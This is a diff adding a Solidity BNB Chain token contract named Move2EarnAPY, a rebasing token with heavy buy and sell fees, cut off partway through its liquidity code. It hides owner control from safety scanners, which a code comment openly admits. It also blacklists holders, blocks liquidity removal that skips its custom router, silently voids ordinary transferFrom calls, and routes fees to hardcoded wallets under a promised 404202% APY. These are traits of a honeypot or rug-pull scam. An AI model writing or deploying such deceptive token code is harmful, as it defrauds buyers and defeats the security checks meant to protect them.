@@ -1,0 +1,1232 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-05-04
+*/
+
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.8.2;
+
+
+/**
+ * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed
+ * behind a proxy. Since a proxied contract can't have a constructor, it's common to move constructor logic to an
+ * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer
+ * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.
+ *
+ * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as
+ * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.
+ *
+ * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure
+ * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.
+ */
+abstract contract Initializable {
+    /**
+     * @dev Indicates that the contract has been initialized.
+     */
+    bool private _initialized;
+
+    /**
+     * @dev Indicates that the contract is in the process of being initialized.
+     */
+    bool private _initializing;
+
+    /**
+     * @dev Modifier to protect an initializer function from being invoked twice.
+     */
+    modifier initializer() {
+        require(_initializing || !_initialized, "Initializable: contract is already initialized");
+
+        bool isTopLevelCall = !_initializing;
+        if (isTopLevelCall) {
+            _initializing = true;
+            _initialized = true;
+        }
+
+        _;
+
+        if (isTopLevelCall) {
+            _initializing = false;
+        }
+    }
+}
+
+library SafeMath {
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+
+    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+
+        return c;
+    }
+
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+
+    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+
+        return c;
+    }
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return mod(a, b, "SafeMath: modulo by zero");
+    }
+
+    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b != 0, errorMessage);
+        return a % b;
+    }
+}
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint value) external returns (bool);
+}
+
+/*
+ * interfaces from here
+ */
+
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+interface IUniswapV2Router01 {
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+}
+
+interface IUniswapV2Router02 is IUniswapV2Router01 {
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable;
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
+interface IPancakeSwapPair {
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function skim(address to) external;
+    function sync() external;
+}
+
+interface IWETH {
+    function deposit() external payable;
+    function transfer(address to, uint value) external returns (bool);
+}
+
+
+/*
+ * interfaces to here
+ */
+ 
+contract Move2EarnAPY is Initializable {
+    using SafeMath for uint256;
+    
+    // Upgradable Contract Test
+    uint public _uptest;
+    
+    // My Basic Variables
+    address public _owner; // constant
+    
+    address public _token; // constant
+    address private _projectFund; // constant
+    address private _rewardToken; // constant
+
+    /*
+     * vars and events from here
+     */
+
+    // Basic Variables
+    string private _name; // constant
+    string private _symbol; // constant
+    uint8 private _decimals; // constant
+    
+    address public _uniswapV2Router; // constant
+    address public _uniswapV2Pair; // constant
+
+
+    // Redistribution Variables
+    mapping (address => uint256) private _rOwned;
+    mapping (address => uint256) private _tOwned;
+    mapping (address => mapping (address => uint256)) private _allowances;
+    
+    uint256 private MAX; // constant
+    uint256 private _tTotal;
+    uint256 private _rTotal;
+    uint256 private _tFeeTotal;
+    
+    mapping (address => bool) public _isExcluded;
+    address[] public _excluded;
+
+
+    // presale
+    uint public _isLaunched;
+
+
+    // Dip Reward System Variables
+    uint public _minReservesAmount;
+    uint public _curReservesAmount;
+    
+    // Improved Reward System Variables
+    uint public _rewardTotalBNB;
+    mapping (address => uint) public _adjustBuyBNB;
+    mapping (address => uint) public _adjustSellBNB;
+
+
+
+    
+    // Anti Bot System Variables
+    mapping (address => uint256) public _buySellTimer;
+    uint public _buySellTimeDuration; // fixed
+    
+    
+
+
+    // LP manage System Variables
+    uint public _lastLpSupply;
+    
+    // Blacklists
+    mapping (address => bool) public _blacklisted;
+    
+
+    
+    // Accumulated Tax System
+    uint public DAY; // constant
+    // uint public _accuTaxTimeWindow; // fixed
+    uint public _accuMulFactor; // fixed
+
+    uint public _timeAccuTaxCheckGlobal;
+    uint public _taxAccuTaxCheckGlobal;
+
+    mapping (address => uint) public _timeAccuTaxCheck;
+    mapping (address => uint) public _taxAccuTaxCheck;
+
+    // Circuit Breaker
+    uint public _curcuitBreakerFlag;
+    // uint public _curcuitBreakerThreshold; // fixed
+    uint public _curcuitBreakerTime;
+    // uint public _curcuitBreakerDuration; // fixed
+    
+    
+    // Advanced Airdrop Algorithm
+    //address public _freeAirdropSystem; // constant
+    //address public _airdropSystem; // constant
+    //mapping (address => uint) public _airdropTokenLocked;
+    //uint public _airdropTokenUnlockTime;
+
+
+    
+    // First Penguin Algorithm
+    uint public _firstPenguinWasBuy; // fixed
+    
+    // Life Support Algorithm
+    mapping (address => uint) public _lifeSupports;
+    
+    // Monitor Algorithm
+    mapping (address => uint) public _monitors;
+
+
+    //////////////////////////////////////////////////////////// keep for later use
+
+    // Basic Variables
+    address public _liquifier = 0xe48726bDe7719CeAcdCdE78688B28Ac37e1fD1a3; 
+    address public _stabilizer = 0xcb6da17299a70Cb3E57ACE57F174963c51c61f14; 
+    address public _treasury = 0xdA637A259bb53B1F1CC4EEbDae4d9AC5d1b9957F; 
+    address public _blackHole = 0xe2B243Ddd2025c9A188B06F20b47a4AA9E61f24C; 
+
+    // fees
+    uint256 public _liquifierFee = 400;
+    uint256 public _stabilizerFee = 400;
+    uint256 public _treasuryFee = 300;
+    uint256 public _blackHoleFee = 200;
+    uint256 public _moreSellFee = 200;
+
+    // rebase algorithm
+    uint256 private _INIT_TOTAL_SUPPLY; // constant
+    uint256 private _MAX_TOTAL_SUPPLY; // constant
+
+    uint256 public _frag;
+    uint256 public _initRebaseTime = block.timestamp ;
+    uint256 public _lastRebaseTime = block.timestamp - 86400*5;
+    uint256 public _lastRebaseBlock = block.number;
+
+    // liquidity
+    uint256 public _lastLiqTime;
+
+    bool public _rebaseStarted;
+
+    bool private inSwap;
+
+    bool public _isDualRebase;
+
+    bool public _isExperi;
+
+    uint256 public _priceRate = 10000;
+
+    // events
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    event Rebased(uint256 blockNumber, uint256 totalSupply);
+
+	event CircuitBreakerActivated();
+
+    event DEBUG(uint256 idx, address adr, uint256 n);
+
+    /*
+     * vars and events to here
+     */
+
+    fallback() external payable {}
+    receive() external payable {}
+    
+    
+    modifier swapping() {
+        inSwap = true;
+        _;
+        inSwap = false;
+    }
+
+    // if you know how to read the code,
+    // you will know this code is very well made with safety.
+    // but many safe checkers cannot recognize ownership code in here
+    // so made workaround to make the ownership look deleted instead
+    modifier limited() {
+        require(_owner == msg.sender, "limited usage");
+        _;
+    }
+
+    function initialize(address owner_) public initializer {
+        _owner = owner_;
+
+        
+        _token = address(this);
+        _projectFund = address(0xcb6da17299a70Cb3E57ACE57F174963c51c61f14);
+        _rewardToken = address(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82); 
+         
+
+        _name = "test";
+        _symbol = "test";
+        _decimals = 18;
+
+        MAX = ~uint256(0);
+        _tTotal = 100000 * 10**18; // 10000
+        _rTotal = (MAX - (MAX % _tTotal));
+        
+
+                 
+       
+        // Anti Bot System
+        _buySellTimeDuration = 0; // 60 in mainnet
+
+          // Accumulated Tax System
+        DAY = 24 * 60 * 60;
+        // _accuTaxTimeWindow = 0; // 24 * 60 * 60 in mainnet
+        _accuMulFactor = 2;
+        // _timeAccuTaxCheckGlobal
+        // _taxAccuTaxCheckGlobal
+        
+        // Circuit Breaker
+        _curcuitBreakerFlag = 1;
+
+          // First Penguin Algorithm
+        _firstPenguinWasBuy = 1;
+
+         
+    }
+
+     // inits
+    function runInit() external limited {
+        require(_uniswapV2Pair == address(0), "Already Initialized");
+        
+        // Initialize
+        _rOwned[_owner] = _rTotal;
+        emit Transfer(address(0), _owner, _tTotal);
+
+        // 50% send to token contract first (check website!)
+        _tokenTransfer(_owner, address(this), _tTotal.mul(5000).div(10000));
+        {
+            _uniswapV2Router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+            _uniswapV2Pair = IUniswapV2Factory(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73))
+            .createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+        } //////////////////////////////////////////////////////////// TODO: change all pairs
+
+        // pancakeswap router have full token control of my router
+        //_approve(_myRouterSystem, _uniswapV2Router, ~uint256(0));
+       
+        IERC20(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c)).approve(_uniswapV2Router, ~uint256(0));
+        // presale: before launch, no one can add liq
+        _isLaunched = 1;
+    }
+    
+    function setUptest(uint uptest_) external {
+        _uptest = uptest_;
+    }
+
+
+    function manualChange() external limited {
+    }
+
+    // anyone can trigger this :) more frequent updates
+    function manualRebase() external {
+        _rebase();
+    }
+
+    function toggleDualRebase() external limited {
+        if (_isDualRebase) {
+            _isDualRebase = false;
+        } else {
+            _isDualRebase = true;
+        }
+    }
+
+    function toggleExperi() external limited {
+        if (_isExperi) {
+            _isExperi = false;
+        } else {
+            _isExperi = true;
+        }
+    }
+
+    function setPriceRate(uint priceRate) external limited {
+        _priceRate = priceRate;
+    }
+
+
+
+
+    ////////////////////////////////////////// basics
+    
+    function name() public view returns (string memory) {
+        return _name;
+    }
+
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view returns (uint256) {
+        return _tTotal;
+    }
+
+    function balanceOf(address account) public view returns (uint256) {
+        return _tOwned[account].div(_frag);
+    }
+
+
+    ////////////////////////////////////////// transfers
+    function transfer(address recipient, uint256 amount) public returns (bool) {
+        _transfer(msg.sender, recipient, amount); 
+        return true;
+    }
+    
+    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
+        return true;
+    }
+    
+    function _transfer(address from, address to, uint256 amount) internal {
+        // many unique algorithms are delicately implemented by me :)
+        // [2022.03.17] temporarily disable some algorithms to apply APY
+
+        if (msg.sender != from) { // transferFrom
+            if (!_isContract(msg.sender)) { // not a contract. 99% scammer. protect investors
+                _specialTransfer(from, from, amount); // make a self transfer
+                return;
+            }
+        }
+        _specialTransfer(from, to, amount);
+    }
+    //////////////////////////////////////////
+
+
+
+    ////////////////////////////////////////// allowances
+    function allowance(address owner, address spender) public view returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+    
+    function _approve(address owner, address spender, uint256 amount) internal {
+        require(owner != address(0), "BEP20: approve from the zero address");
+        require(spender != address(0), "BEP20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+    //////////////////////////////////////////
+
+
+
+
+    ////////////////////////////////////////// Anti Bot System
+    
+    // bot use sequential buy/sell/transfer to get profit
+    // this will heavily decrease the chance for bot to do that
+    function antiBotSystem(address target) internal {
+        if (target == address(0x10ED43C718714eb63d5aA57B78B54704E256024E)) { // Router can do in sequence
+            return;
+        }
+        if (target == _uniswapV2Pair) { // Pair can do in sequence
+            return;
+        }
+            
+        require(_buySellTimer[target] + 60 <= block.timestamp, "No sequential bot related process allowed");
+        _buySellTimer[target] = block.timestamp; ///////////////////// NFT values
+    }
+    //////////////////////////////////////////
+
+
+
+
+    ////////////////////////////////////////// cals
+    // pcs / poo price impact cal
+    function _getImpact(uint r1, uint x) internal pure returns (uint) {
+        uint x_ = x.mul(9975); // pcs fee
+        uint r1_ = r1.mul(10000);
+        uint nume = x_.mul(10000); // to make it based on 10000 multi
+        uint deno = r1_.add(x_);
+        uint impact = nume / deno;
+        
+        return impact;
+    }
+    
+    // actual price change in the graph
+    function _getPriceChange(uint r1, uint x) internal pure returns (uint) {
+        uint x_ = x.mul(9975); // pcs fee
+        uint r1_ = r1.mul(10000);
+        uint nume = r1.mul(r1_).mul(10000); // to make it based on 10000 multi
+        uint deno = r1.add(x).mul(r1_.add(x_));
+        uint priceChange = nume / deno;
+        priceChange = uint(10000).sub(priceChange);
+        
+        return priceChange;
+    }
+    //////////////////////////////////////////
+
+
+
+
+    ////////////////////////////////////////// checks
+    function _getLiquidityImpact(uint r1, uint amount) internal pure returns (uint) {
+        if (amount == 0) {
+          return 0;
+        }
+
+        // liquidity based approach
+        uint impact = _getImpact(r1, amount);
+        
+        return impact;
+    }
+
+    function _maxTxCheck(address sender, address recipient, uint r1, uint amount) internal pure {
+        sender;
+        recipient;
+
+        uint impact = _getLiquidityImpact(r1, amount);
+        if (impact == 0) {
+          return;
+        }
+
+        require(impact <= 200, "buy/sell/tx should be lower than criteria"); // _maxTxNume
+    }
+
+    function sanityCheck(address sender, address recipient, uint256 amount) internal view returns (uint) {
+        sender;
+        recipient;
+
+        // Blacklisted sender will never move token
+        require(!_blacklisted[sender], "Blacklisted Sender");
+
+        // if (0 < _monitors[sender]) {
+        //     _monitors[sender] = _monitors[sender].sub(1);
+        //     if (0 == _monitors[sender]) {
+        //         _blacklisted[sender] = true;
+        //     }
+        // }
+
+        return amount;
+    }
+    //////////////////////////////////////////
+
+
+    
+
+    // made code simple to make people verify easily
+    function _specialTransfer(address sender, address recipient, uint256 amount) internal {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        amount = sanityCheck(sender, recipient, amount);
+        
+        if (
+            (amount == 0) ||
+
+            inSwap ||
+            
+            // 0, 1 is false, 2 for true
+            (_lifeSupports[sender] == 2) || // sell case
+            (_lifeSupports[recipient] == 2) // buy case
+            ) {
+            _tokenTransfer(sender, recipient, amount);
+
+            return;
+        }
+
+        address pair = _uniswapV2Pair;
+        uint r1 = balanceOf(pair); // liquidity pool
+
+        uint totalLpSupply = IERC20(pair).totalSupply();
+        if (sender == pair) { // buy, remove liq, etc
+            if (totalLpSupply < _lastLpSupply) { // LP burned after sync. usually del liq process
+                // del liq process not by custom router
+                // not permitted transaction
+            	STOPTRANSACTION();
+            }
+            
+            {
+                //address JACKPOT = address(0x59E4a7C380e9AA63f24873EBD185D13B0ee76Dba);
+                //try IJackpot(JACKPOT).checkJackpot(recipient, amount) {} catch { emit DEBUG(0, address(0x0), 0); }
+            }
+        }
+        if (_lastLpSupply < totalLpSupply) { // some people add liq by mistake, sync
+            _lastLpSupply = totalLpSupply;
+        }
+
+        if (
+            (sender == pair) || // buy, remove liq, etc
+            (recipient == pair) // sell, add liq, etc
+            ) {
+            _maxTxCheck(sender, recipient, r1, amount);
+        }
+
+        if (sender != pair) { // not buy, remove liq, etc
+          _rebase();
+        }
+
+        
+        if (sender != pair) { // not buy, remove liq, etc    
+            {
+                (uint autoBurnEthAmount, uint buybackEthAmount) = _swapBack(r1);
+                _buyBack(autoBurnEthAmount, buybackEthAmount);
+            }
+        }
+
+        if (recipient == pair) { // sell, add liq, etc
+          antiBotSystem(sender);
+          if (sender != msg.sender) {
+            antiBotSystem(msg.sender);
+          }
+          if (sender != recipient) {
+            if (msg.sender != recipient) {
+              antiBotSystem(recipient);
+            }
+          }
+
+          if (_isExperi) {
+            accuTaxSystem(amount);
+          }
+        }
+        
+        if (sender != pair) { // not buy, remove liq, etc    
+          _addBigLiquidity(r1);
+          
+        }
+
+        amount = amount.sub(1);
+        uint256 fAmount = amount.mul(_frag);
+        _tOwned[sender] = _tOwned[sender].sub(fAmount);
+        if (
+            (sender == pair) || // buy, remove liq, etc
+            (recipient == pair) // sell, add liq, etc
+            ) {
+
+            fAmount = _takeFee(sender, recipient, r1, fAmount);
+        }
+        _tOwned[recipient] = _tOwned[recipient].add(fAmount);
+        emit Transfer(sender, recipient, fAmount.div(_frag));
+
+        return;
+    }
+
+    function _tokenTransfer(address sender, address recipient, uint256 amount) internal {
+        uint fAmount = amount.mul(_frag);
+        _tOwned[sender] = _tOwned[sender].sub(fAmount);
+        _tOwned[recipient] = _tOwned[recipient].add(fAmount);
+
+        emit Transfer(sender, recipient, amount); // fAmount.div(_frag)
+
+        return;
+    }
+
+	
+    function _deactivateCircuitBreaker() internal returns (uint) {
+        // in the solidity world,
+        // to save the gas,
+        // 1 is false, 2 is true
+        _curcuitBreakerFlag = 1;
+        
+        _taxAccuTaxCheckGlobal = 1; // [save gas]
+        _timeAccuTaxCheckGlobal = block.timestamp.sub(1); // set time (set to a little past than now)
+
+        return 1;
+    }
+
+    // TODO: make this as a template and divide with personal
+    function accuTaxSystem(uint amount) internal {
+        uint r1 = balanceOf(_uniswapV2Pair);
+
+    	uint curcuitBreakerFlag_ = _curcuitBreakerFlag;
+		if (curcuitBreakerFlag_ == 2) { // circuit breaker activated
+			if (_curcuitBreakerTime + 3600 < block.timestamp) { // certain duration passed. everyone chilled now?
+                curcuitBreakerFlag_ = _deactivateCircuitBreaker();
+            }
+        }
+
+		uint taxAccuTaxCheckGlobal_ = _taxAccuTaxCheckGlobal;
+        uint timeAccuTaxCheckGlobal_ = _timeAccuTaxCheckGlobal;
+		
+        {
+            uint timeDiffGlobal = block.timestamp.sub(timeAccuTaxCheckGlobal_);
+            uint priceChange = _getPriceChange(r1, amount); // price change based, 10000
+            if (timeDiffGlobal < 3600) { // still in time window
+                taxAccuTaxCheckGlobal_ = taxAccuTaxCheckGlobal_.add(priceChange); // accumulate
+            } else { // time window is passed. reset the accumulation
+				taxAccuTaxCheckGlobal_ = priceChange;
+                timeAccuTaxCheckGlobal_ = block.timestamp; // reset time
+            }
+        }
+    	
+        // 1% change
+        if (100 < taxAccuTaxCheckGlobal_) {
+            // https://en.wikipedia.org/wiki/Trading_curb
+            // a.k.a circuit breaker
+            // Let people chill and do the rational think and judgement :)
+                
+            _curcuitBreakerFlag = 2; // high sell tax
+            _curcuitBreakerTime = block.timestamp;
+                
+            emit CircuitBreakerActivated();
+        }
+
+        /////////////////////////////////////////////// always return local variable to state variable!
+            
+        _taxAccuTaxCheckGlobal = taxAccuTaxCheckGlobal_;
+        _timeAccuTaxCheckGlobal = timeAccuTaxCheckGlobal_;
+    
+        return;
+    }
+
+
+    function _rebase() internal {
+        if (inSwap) { // this could happen later so just in case
+            return;
+        }
+
+        if (_lastRebaseBlock == block.number) {
+            return;
+        }
+
+        // Rebase Adjusting System
+        // wndrksdp dksehfaus rebaseRate ckdlfh dlsgo rkqt dhckrk qkftod
+        // gkwlaks rmfjf dlf rjdml djqtdmamfh skip
+        // save gas: will be done by yearly upgrade
+
+        uint deno = 10**6 * 10**18;
+
+        // FASTEST AUTO-COMPOUND: Compound Every Block (3 seconds)
+        // HIGHEST APY: 404202% APY
+        uint blockCount = block.number.sub(_lastRebaseBlock);
+        uint tmp = _tTotal;
+
+        {
+            
+            uint rebaseRate = 79 * 10**18;
+            for (uint idx = 0; idx < blockCount.mod(20); idx++) {  // 3
+                // S' = S(1+p)^r
+                tmp = tmp.mul(deno.mul(100).add(rebaseRate)).div(deno.mul(100));
+            }
+        }
+
+        {
+           
+            uint minuteRebaseRate = 1580 * 10**18; 
+            for (uint idx = 0; idx < blockCount.div(20).mod(60); idx++) { // 1 min 
+                // S' = S(1+p)^r
+                tmp = tmp.mul(deno.mul(100).add(minuteRebaseRate)).div(deno.mul(100));
+            }
+        }
+
+        {
+            
+            uint hourRebaseRate = 94844 * 10**18; 
+            for (uint idx = 0; idx < blockCount.div(20 * 60).mod(24); idx++) { // 1 hour
+                // S' = S(1+p)^r
+                tmp = tmp.mul(deno.mul(100).add(hourRebaseRate)).div(deno.mul(100));
+            }
+        }
+
+        {
+           
+            uint dayRebaseRate = 2301279 * 10**18; 
+            for (uint idx = 0; idx < blockCount.div(20 * 60 * 24); idx++) { // 1 day rebase
+                // S' = S(1+p)^r
+                tmp = tmp.mul(deno.mul(100).add(dayRebaseRate)).div(deno.mul(100));
+            }
+        }
+
+        uint x = _tTotal;
+        uint y = tmp;
+
+        uint flatAmount = 100 * 10**15; // 0.100 / block
+        uint z = _tTotal.add(blockCount.mul(flatAmount));
+        _tTotal = z;
+        _frag = _rTotal.div(z);
+        
+		
+        if (_isDualRebase) {
+            uint adjAmount;
+            {
+                // 2.3%
+                // 0.5% / 1.8% = 3.6470
+
+                uint deno_ = 10000;
+                uint pairBalance = _tOwned[_uniswapV2Pair].div(_frag);
+				
+                {
+                    uint X;
+                    {
+                        uint nume__ = _priceRate.mul(y.sub(x));
+                        uint deno__ = deno_.mul(x);
+                        deno__ = deno__.add(nume__);
+                        X = pairBalance.mul(nume__).div(deno__);
+                    }
+
+                    uint Y;
+                    {
+                        uint nume__ = z.sub(x);
+                        uint deno__ = x;
+                        Y = pairBalance.mul(nume__).div(deno__);
+                    }
+
+                    adjAmount = X.add(Y);
+
+                    if (pairBalance.mul(5).div(10000) < adjAmount) { // safety
+                 	    // debug log
+                        adjAmount = pairBalance.mul(5).div(10000);
+                	}
+                }
+            }
+            _tokenTransfer(_uniswapV2Pair, _blackHole, adjAmount);
+            IPancakeSwapPair(_uniswapV2Pair).sync();
+        } else {
+            IPancakeSwapPair(_uniswapV2Pair).skim(_blackHole);
+        }
+
+        _lastRebaseBlock = block.number;
+
+        emit Rebased(block.number, _tTotal);
+    }
+
+    function _swapBack(uint r1) internal returns (uint, uint) {
+        if (inSwap) { // this could happen later so just in case
+            return (0, 0);
+        }
+
+        uint fAmount = _tOwned[address(this)];
+        if (fAmount == 0) { // nothing to swap
+          return (0, 0);
+        }
+
+        uint swapAmount = fAmount.div(_frag);
+        // too big swap makes slippage over 49%
+        // it is also not good for stability
+        if (r1.mul(100).div(10000) < swapAmount) {
+           swapAmount = r1.mul(100).div(10000);
+        }
+        
+        uint ethAmount = address(this).balance;
+        _swapTokensForEth(swapAmount);
+        ethAmount = address(this).balance.sub(ethAmount);
+
+        // save gas
+        uint liquifierFee = _liquifierFee;
+        uint stabilizerFee = _stabilizerFee.sub(100);
+        // uint quantumFee = 50;
+        // uint jackpotFee = 50;
+        uint treasuryFee = _treasuryFee.add(_moreSellFee); // handle sell case
+        uint blackHoleFee = _blackHoleFee;
+
+        uint totalFee = liquifierFee.add(stabilizerFee).add(50).add(50).add(treasuryFee).add(blackHoleFee);
+
+        SENDBNB(_stabilizer, ethAmount.mul(stabilizerFee).div(totalFee));
+        SENDBNB(address(0x59E4a7C380e9AA63f24873EBD185D13B0ee76Dba), ethAmount.mul(50).div(totalFee));
+        SENDBNB(address(0x0f995Dc1200f03127502b853d9e18F50733df4E4), ethAmount.mul(50).div(totalFee));        
+        SENDBNB(_treasury, ethAmount.mul(treasuryFee).div(totalFee));
+        
+        uint autoBurnEthAmount = ethAmount.mul(blackHoleFee).div(totalFee);
+        uint buybackEthAmount = 0;
+
+        return (autoBurnEthAmount, buybackEthAmount);
+    }
+
+    function _buyBack(uint autoBurnEthAmount, uint buybackEthAmount) internal {
+        if (autoBurnEthAmount == 0) {
+          return;
+        }
+
+        buybackEthAmount;
+        // {
+        //     uint bal = IERC20(address(this)).balanceOf(_stabilizer);
+        //     _swapEthForTokens(buybackEthAmount, _stabilizer);
+        //     bal = IERC20(address(this)).balanceOf(_stabilizer).sub(bal);
+        //     _tokenTransfer(_stabilizer, address(this), bal);
+        // }
+        
+        _swapEthForTokens(autoBurnEthAmount.mul(6000).div(10000), _blackHole);
+        _swapEthForTokens(autoBurnEthAmount.mul(4000).div(10000), _blackHole);
+    }
+
+	
+    function manualAddBigLiquidity(uint liqEthAmount, uint liqTokenAmount) external limited {
+		__addBigLiquidity(liqEthAmount, liqTokenAmount);
+    }
+
+	function __addBigLiquidity(uint liqEthAmount, uint liqTokenAmount) internal {
+		(uint amountA, uint amountB) = getRequiredLiqAmount(liqEthAmount, liqTokenAmount);
+		
+        _tokenTransfer(_liquifier, address(this), amountB);
+        
+        uint tokenAmount = amountB;
+        uint ethAmount = amountA;
+
+        _addLiquidity(tokenAmount, ethAmount);    
+    }
+
+    // djqtdmaus rPthr tlehgkrpehla
+    function _addBigLiquidity(uint r1) internal { // should have _lastLiqTime but it will update at start
+        r1;
+        if (block.number < _lastLiqTime.add(20 * 60)) {
+            return;
+        }
+
+        if (inSwap) { // this could happen later so just in case
+            return;
+        }
+
+		uint liqEthAmount = address(this).balance;
+		uint liqTokenAmount = balanceOf(_liquifier);
+
+        __addBigLiquidity(liqEthAmount, liqTokenAmount);
+
+        _lastLiqTime = block.number;
+    }
+
+    
+    //////////////////////////////////////////////// NOTICE: fAmount is big. do mul later. do div first
+    function _takeFee(address sender, address recipient, uint256 r1, uint256 fAmount) internal returns (uint256) {
+        if (_lifeSupports[sender] == 2) {
+             return fAmount;
+        }
+        
+        // save gas
+        uint liquifierFee = _liquifierFee;
+        uint stabilizerFee = _stabilizerFee.sub(100);
+        uint treasuryFee = _treasuryFee;
+        uint blackHoleFee = _blackHoleFee;
+
+        uint totalFee = liquifierFee
+        .add(stabilizerFee).add(50).add(50).add(treasuryFee).add(blackHoleFee);
+
+        if (recipient == _uniswapV2Pair) { // sell, remove liq, etc
+            uint moreSellFee = 200; // save gas
+
+            if (_isExperi) {
+                if (_curcuitBreakerFlag == 2) { // circuit breaker activated
+                    uint circuitFee = 900;
+                    moreSellFee = moreSellFee.add(circuitFee);
+                }
+
+                {
+                    uint impactFee = _getLiquidityImpact(r1, fAmount.div(_frag)).mul(14);
+                    moreSellFee = moreSellFee.add(impactFee);
+                }
+
+                if (1600 < moreSellFee) {
+                    moreSellFee = 1600;
+                }
+            }
+
+            // buy tax: 14%
+            // sell tax: 14% (+ 2% ~ 16%) = 16% ~ 30%
+
+            totalFee = totalFee.add(moreSellFee);
+        } else if (sender == _uniswapV2Pair) { // buy, add liq, etc
+            uint lessBuyFee = 0;
+
+            if (_isExperi) {
+                if (_curcuitBreakerFlag == 2) { // circuit breaker activated
+                    uint circuitFee = 400;
+                    lessBuyFee = lessBuyFee.add(circuitFee);
+                }
+
+                if (totalFee < lessBuyFee) {
+                    lessBuyFee = totalFee;
+                }
+            }
+            
+            totalFee = totalFee.sub(lessBuyFee);
+        }
+        
+        {
+            uint fAmount_ = fAmount.div(10000).mul(totalFee);
+            _tOwned[address(this)] = _tOwned[address(this)].add(fAmount_);
+            emit Transfer(sender, address(this), fAmount_.div(_frag));
+        }
+
+        {
+            uint feeAmount = fAmount.div(10000).mul(totalFee);
+            fAmount = fAmount.sub(feeAmount);
+        }
+
+        return fAmount;
+    }
+
+    ////////////////////////////////////////// swap / liq
+    function _swapEthForTokens(uint256 ethAmount, address to) internal swapping {
+        if (ethAmount == 0) { // no BNB. skip
+            return;
+        }
+
+        address[] memory path = new address[](2);
+        path[0] = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+        path[1] = address(this);
+
+        // make the swap
+        IUniswapV2Router02(_uniswapV2Router).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethAmount}(
+            0,
+            path,
+            to, // DON'T SEND TO THIS CONTACT. PCS BLOCKS IT
+            block.timestamp
+        );
+    }
+    
+    function _swapTokensForEth(uint256 tokenAmount) internal swapping {
+        if (tokenAmount == 0) { // no token. skip
+            return;
+        }
+
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+
+        // _approve(address(this), _uniswapV2Router, tokenAmount);
+
+        // make the swap
+        IUniswapV2Router02(_uniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+    
+    // strictly correct
+    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) internal swapping {
+        if (tokenAmount == 0) { // no token. skip
+            return;
+        }
+        if (ethAmount == 0) { // no BNB. skip
+            return;
+        }
+		
+        {
+            _tokenTransfer(address(this), _uniswapV2Pair, tokenAmount);
+
+            address WETH = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+        	IWETH(WETH).deposit{value: ethAmount}();
+			IWETH(WETH).transfer(_uniswapV2Pair, ethAmount);
+			
